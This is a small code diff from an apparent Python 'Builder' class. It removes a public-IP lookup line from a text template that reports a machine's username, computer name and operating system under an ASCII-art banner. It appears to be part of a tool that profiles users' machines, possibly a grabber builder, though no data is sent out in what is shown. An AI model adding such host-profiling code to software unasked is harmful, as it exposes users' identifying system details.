@@ -134,7 +134,6 @@ class Builder:
                                                                   .,***,                                                        ,*/*,..
 
 
-                      IP: {load(urlopen('https://api.myip.com/'))['ip']}
                 Username: {os.getlogin()}
                  PC Name: {os.getenv('COMPUTERNAME')}
         Operating System: {os.getenv('OS')}
